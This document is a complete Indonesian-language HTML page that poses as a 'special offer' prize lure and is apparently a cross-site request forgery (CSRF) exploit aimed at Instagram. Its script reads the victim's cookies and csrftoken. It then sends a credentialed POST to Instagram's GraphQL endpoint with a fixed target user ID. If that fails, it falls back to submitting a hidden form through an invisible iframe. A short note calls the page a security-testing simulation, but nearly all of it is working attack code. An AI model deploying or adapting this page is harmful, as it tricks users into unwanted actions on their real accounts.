<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penawaran Spesial Terbatas!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        .offer {
            text-align: center;
            margin: 20px 0;
            padding: 15px;
            background-color: #e8f4f8;
            border-radius: 8px;
            border-left: 4px solid #3498db;
        }
        .button {
            display: block;
            width: 200px;
            margin: 30px auto;
            padding: 12px;
            background-color: #3498db;
            color: white;
            text-align: center;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            cursor: pointer;
        }
        .button:hover {
            background-color: #2980b9;
        }
        .hidden-form {
            display: none;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #7f8c8d;
        }
        .info-box {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            font-size: 14px;
        }
        .info-box h3 {
            margin-top: 0;
            color: #856404;
        }
        .debug-info {
            background-color: #f8f9fa;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 14px;
            white-space: pre-wrap;
            display: none;
        }
        .toggle-debug {
            color: #3498db;
            cursor: pointer;
            font-size: 12px;
            text-align: center;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Penawaran Spesial Hari Ini!</h1>
        
        <div class="offer">
            <p>Selamat! Anda terpilih untuk mendapatkan penawaran eksklusif kami. 
               Klik tombol di bawah untuk mengklaim diskon spesial Anda.</p>
        </div>
        
        <a class="button" onclick="submitForm()">Klaim Sekarang!</a>
        
        <div class="toggle-debug" onclick="toggleDebug()">▼ Tampilkan Info Debug</div>
        <div id="debugInfo" class="debug-info"></div>
        
        <div class="info-box">
            <h3>Informasi Penting:</h3>
            <p>Halaman ini adalah simulasi untuk testing keamanan. Request mungkin diblokir oleh kebijakan CORS atau perlindungan CSRF server.</p>
        </div>
        
        <!-- Form untuk CSRF attack -->
        <form id="csrfForm" class="hidden-form" action="https://www.instagram.com/graphql/query" method="POST">
            <input type="hidden" name="variables" value='{"target_user_id":"39902309948"}' />
            <input type="hidden" name="doc_id" value="9740159112729312" />
        </form>
    </div>
    
    <div class="footer">
        <p>© 2023 Contoh Situs. Semua hak dilindungi.</p>
    </div>

    <script>
        // Fungsi untuk mendapatkan nilai cookie berdasarkan nama
        function getCookie(name) {
            let cookieValue = null;
            if (document.cookie && document.cookie !== '') {
                const cookies = document.cookie.split(';');
                for (let i = 0; i < cookies.length; i++) {
                    const cookie = cookies[i].trim();
                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }

        // Fungsi untuk menampilkan info debug
        function toggleDebug() {
            const debugInfo = document.getElementById('debugInfo');
            const toggleBtn = document.querySelector('.toggle-debug');
            
            if (debugInfo.style.display === 'none') {
                const csrfToken = getCookie('csrftoken');
                debugInfo.innerHTML = `Cookie yang tersedia:\n${document.cookie}\n\nNilai csrftoken: ${csrfToken || 'Tidak ditemukan'}`;
                debugInfo.style.display = 'block';
                toggleBtn.innerHTML = '▲ Sembunyikan Info Debug';
            } else {
                debugInfo.style.display = 'none';
                toggleBtn.innerHTML = '▼ Tampilkan Info Debug';
            }
        }

        // Fungsi untuk melakukan submit form dengan header CSRF
        function submitForm() {
            // Dapatkan nilai CSRF token dari cookie
            const csrfToken = getCookie('csrftoken');
            
            if (!csrfToken) {
                alert('CSRF Token tidak ditemukan dalam cookie. Pastikan Anda sudah login ke situs target.');
                return;
            }
            
            // Tampilkan informasi debug
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML = `Menggunakan CSRF Token: ${csrfToken}\n\nMengirim request ke: https://www.instagram.com/graphql/query`;
            debugInfo.style.display = 'block';
            
            // Buat form secara programatik
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://www.instagram.com/graphql/query';
            form.style.display = 'none';
            
            // Tambahkan input fields
            const variablesInput = document.createElement('input');
            variablesInput.type = 'hidden';
            variablesInput.name = 'variables';
            variablesInput.value = '{"target_user_id":"39902309948"}';
            form.appendChild(variablesInput);
            
            const docIdInput = document.createElement('input');
            docIdInput.type = 'hidden';
            docIdInput.name = 'doc_id';
            docIdInput.value = '9740159112729312';
            form.appendChild(docIdInput);
            
            // Tambahkan form ke body
            document.body.appendChild(form);
            
            // Gunakan fetch API untuk mengirim request dengan header kustom
            fetch(form.action, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Csrftoken': csrfToken
                },
                body: `variables=${encodeURIComponent('{"target_user_id":"39902309948"}')}&doc_id=9740159112729312`,
                // Kirim cookie bersama request
                credentials: 'include'
            })
            .then(response => {
                // Hapus form setelah digunakan
                document.body.removeChild(form);
                
                if (response.ok) {
                    return response.text();
                }
                throw new Error('Request gagal');
            })
            .then(data => {
                debugInfo.innerHTML += '\n\nRequest berhasil dikirim!';
                debugInfo.innerHTML += '\nResponse: ' + data.substring(0, 200) + '...';
            })
            .catch(error => {
                debugInfo.innerHTML += '\n\nError: ' + error.message;
                debugInfo.innerHTML += '\nMencoba metode alternatif...';
                
                // Fallback ke metode form submission tradisional
                setTimeout(() => {
                    // Buat iframe untuk mengirim form
                    const iframe = document.createElement('iframe');
                    iframe.name = 'csrf-frame';
                    iframe.style.display = 'none';
                    
                    iframe.onload = function() {
                        debugInfo.innerHTML += '\nRequest dikirim melalui iframe (mungkin berhasil)';
                    };
                    
                    document.body.appendChild(iframe);
                    
                    // Set form target ke iframe
                    form.target = 'csrf-frame';
                    
                    // Submit form
                    form.submit();
                }, 1000);
            });
            
            alert('Memproses request... Lihat bagian debug info untuk detail.');
        }
    </script>
</body>
</html>